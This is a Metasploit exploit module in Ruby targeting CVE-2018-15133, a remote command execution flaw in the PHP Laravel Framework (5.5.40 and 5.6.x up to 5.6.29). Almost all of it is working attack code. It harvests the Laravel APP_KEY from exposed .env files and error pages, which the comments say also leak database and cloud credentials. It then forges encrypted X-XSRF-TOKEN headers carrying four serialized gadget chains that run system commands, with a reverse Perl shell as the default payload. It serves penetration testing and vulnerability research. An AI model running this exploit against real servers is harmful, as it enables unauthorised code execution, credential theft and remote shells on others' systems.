##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
  super(update_info(info,
    'Name' => 'PHP Laravel Framework token Unserialize Remote Command Execution',
    'Description' => %q{
      This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40, 5.6.x <= 5.6.29.
      Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to
      an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php.
      Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY.
      Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix.
      In some cases the APP_KEY is leaked which allows for discovery and exploitation.
    },
    'DisclosureDate' => 'Aug 07 2018',
    'Author' => [
      'StÃ¥le Pettersen', # Discovery
      'aushack', # msf exploit + other leak
    ],
    'References' => [
      ['URL', 'https://github.com/kozmic/laravel-poc-CVE-2018-15133'],
      ['CVE', '2018-15133'],
      ['URL', 'https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30'],
      ['URL', 'https://github.com/laravel/framework/pull/25121/commits/d84cf988ed5d4661a4bf1fdcb08f5073835083a0']
    ],
    'License' => MSF_LICENSE,
    'Platform' => 'unix',
    'Arch' => ARCH_CMD,
    'DefaultTarget' => 0,
    'Stance' => Msf::Exploit::Stance::Aggressive,
    'DefaultOptions' => {
    'PAYLOAD' => 'cmd/unix/reverse_perl',
    },
      'Payload' => {
      'DisableNops' => true,
    },
      'Targets' => [[ 'Automatic', {} ]],
    ))

  register_options([
    OptString.new('PATH', [ true, "Path to target webapp", "/index.php"]),
    OptString.new('APP_KEY', [ false, "The base64 encoded APP_KEY string from the .env file", ""])
  ])
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => datastore["PATH"],
        'method' => 'GET',
        })
      #vprint_status "Request sent\n#{res.body}\n"
      if res && res.headers && res.headers.to_s =~ /XSRF-TOKEN|laravel_session/i # Can be 'XSRF-TOKEN', 'X-XSRF-TOKEN', 'laravel_session', or $appname_session... and maybe more?

      auth_token = check_appkey()
      if (test_appkey(auth_token) == false)
        return
      else
        if auth_token.blank?
          vprint_status("This module requires a valid APP_KEY to function")
        else
          #vprint_status "FOUND APP_KEY of #{auth_token}\n"
          random_string = Rex::Text.rand_text_alphanumeric(12)

          1.upto(4) do |x|
            vuln = generate_token("echo #{random_string}", auth_token, x)

            res = send_request_cgi({
              'uri' => datastore['PATH'],
              'method' => 'POST',
              'headers' => {
              'X-XSRF-TOKEN' => "#{vuln}",
              }
            })

            if res.body =~ /#{random_string}/
              return CheckCode::Vulnerable
            elsif res.body.to_s =~ /Method Not Allowed/ # Not conclusive but witnessed in the wild
              return CheckCode::Safe
            end
          end
        end
      end
      return CheckCode::Detected
    end
      rescue Rex::ConnectionError
      return CheckCode::Unknown
    end
  end

  def check_appkey
    ret = false

    if datastore["APP_KEY"].present?
      ret = datastore["APP_KEY"]
    elsif datastore["APP_KEY"].empty?
      vprint_status "No APP_KEY set. Will try to find it..."

      vprint_status "Checking for CVE-2017-16894 .env information leak."

      res = send_request_cgi({
        'uri' => '/.env',
        'method' => 'GET',
      })

      if res && res.body =~ /APP_KEY/ # Good but may be other software. Can also check for 'APP_NAME=Laravel' etc
        if res.body =~ /APP_KEY\=base64:(.*)/ # Need the base64 KEY
          str = $1
          vprint_status "APP_KEY Found via CVE-2017-16894 .env information leak: #{str}"
          return str
        else
          vprint_status "Website .env file exists but didn't find a suitable APP_KEY"
        end
      end
    end

    vprint_status "Checking for Laravel Framework information leak."
    # Possible config error / 0day found by aushack during pentest
    # Seen in the wild with recent releases

    res = send_request_cgi({
      'uri' => datastore['PATH'],
      'method' => 'POST',
      'headers' => {
        'X-XSRF-TOKEN' => "#{Rex::Text.rand_text_alpha(1)}" # May trigger
      }
    })

    if res && res.body =~ /DecryptException/ # Good sign but might be more universal with e.g. 'vendor/laravel/framework' ?
      vprint_status "Laravel Framework throws an error!"
      if res.body =~ /APP_KEY/ # Promising!
        vprint_status "Target appears to be vulnerable."
        if res.body =~ /\>base64:(.*)\<\/span\>/ # Leaks all environment config including passwords for databases, AWS, REDIS, SMTP etc... but only the APP_KEY appears to use base64
          str = $1
          vprint_status "APP_KEY Found via Laravel Framework error information leak: #{str}"
          return str
        end
      end
    end
    
    res = send_request_cgi({
      'uri' => datastore['PATH'],
      'method' => 'POST'
    })
    
    if res && res.body =~ /MethodNotAllowedHttpException/ # Good sign but might be more universal with e.g. 'vendor/laravel/framework' ?
      vprint_status "Laravel Framework throws an error!"
      if res.body =~ /APP_KEY/ # Promising!
        vprint_status "Target appears to be vulnerable."
        if res.body =~ /\>base64:(.*)\<\/span\>/ # Leaks all environment config including passwords for databases, AWS, REDIS, SMTP etc... but only the APP_KEY appears to use base64
          str = $1
          vprint_status "APP_KEY Found via Laravel Framework error information leak: #{str}"
          return str
        end
      end
    end
    
    #vprint_status "#{res}"

    return ret
  end

  def test_appkey(value)
    value = Rex::Text.decode_base64(value)
    if value && value.length.to_i == 32
      return true
    else
      vprint_status "Unable to continue: the set datastore APP_KEY value or information leak is invalid."
    end
      return false
    end

  def generate_token(cmd, key, id)
    app_key = key

    case id # Ported phpggc Laravel RCE php objects :)
      when 1
      payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + cmd.length.to_s + ':"' + cmd + '";}'
      when 2
      payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + cmd.length.to_s + ':"' + cmd + '";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + cmd.length.to_s + ':"' + cmd + '";}'
      when 3
      payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + cmd.length.to_s + ':"' + cmd + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}'
      when 4
      payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + cmd.length.to_s + ':"' + cmd + '";}'
    end

    cipher = OpenSSL::Cipher.new('AES-256-CBC') # Or AES-128-CBC - untested
    cipher.encrypt
    cipher.key = Rex::Text.decode_base64(app_key)
    iv = cipher.random_iv

    value = cipher.update(payload_decoded) + cipher.final
    pload = Rex::Text.encode_base64(value)
    iv = Rex::Text.encode_base64(iv)
    mac = OpenSSL::HMAC.hexdigest("SHA256", Rex::Text.decode_base64(app_key), iv+pload)
    iv = iv.gsub('/', '\\/') # Escape slash
    pload = pload.gsub('/', '\\/') # Escape slash
    json_value = '{"iv":"' + iv + '","value":"' + pload + '","mac":"' + mac + '"}'
    json_out = Rex::Text.encode_base64(json_value)

    return json_out
  end

  def exploit

    auth_token = check_appkey()
    if (test_appkey(auth_token) == false)
      return
    elsif auth_token.blank?
        print_status("This module requires a valid APP_KEY to function")
        return
    else
      1.upto(4) do |x|
        sploit = generate_token(payload.encoded, auth_token, x)

        res = send_request_cgi({
          'uri' => datastore['PATH'],
          'method' => 'POST',
          'headers' => {
          'X-XSRF-TOKEN' => "#{sploit}",
          }
        })

        break if session_created? # Stop when one of the deserialization attacks works.

        if res && res.body =~ /The MAC is invalid|Method Not Allowed/ # Not conclusive
          print_status "Target appears to be patched or otherwise immune."
        end
      end
    end
  end
end
